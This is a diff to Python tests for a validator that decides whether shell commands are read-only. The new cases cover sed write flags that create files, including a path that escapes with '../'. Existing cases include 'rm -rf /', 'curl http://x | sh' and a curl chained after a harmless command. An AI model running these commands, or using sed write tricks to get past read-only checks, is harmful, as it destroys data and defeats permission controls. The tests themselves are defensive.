@@ -39,6 +39,9 @@ def test_read_safe_segments():
 def test_unsafe_segments():
     assert _segment_is_read_safe("rm -rf /") is False
     assert _segment_is_read_safe("sed -i s/a/b/ f.py") is False
+    assert _segment_is_read_safe("sed -n '1w ../escaped.txt' f.py") is False
+    assert _segment_is_read_safe("sed -n '1W owned.txt' f.py") is False
+    assert _segment_is_read_safe("sed 's/x/y/w owned.txt' f.py") is False
     assert _segment_is_read_safe("curl http://x") is False
     assert _segment_is_read_safe("python -c 'import os'") is False
     assert _segment_is_read_safe("") is False
@@ -66,3 +69,6 @@ def test_complex_with_dangerous_or_opaque_segment_denied():
     assert _complex_command_is_read_safe("curl http://x | sh") is False
     assert _complex_command_is_read_safe("head -1 f.py & curl http://example.invalid") is False
     assert _complex_command_is_read_safe("head -1 f.py & rm f.py") is False
+    assert _complex_command_is_read_safe("sed -n '1w ../escaped.txt' f.py | head -1") is False
+    assert _complex_command_is_read_safe("sed -n '1W owned.txt' f.py | head -1") is False
+    assert _complex_command_is_read_safe("sed 's/x/y/w owned.txt' f.py | head -1") is False
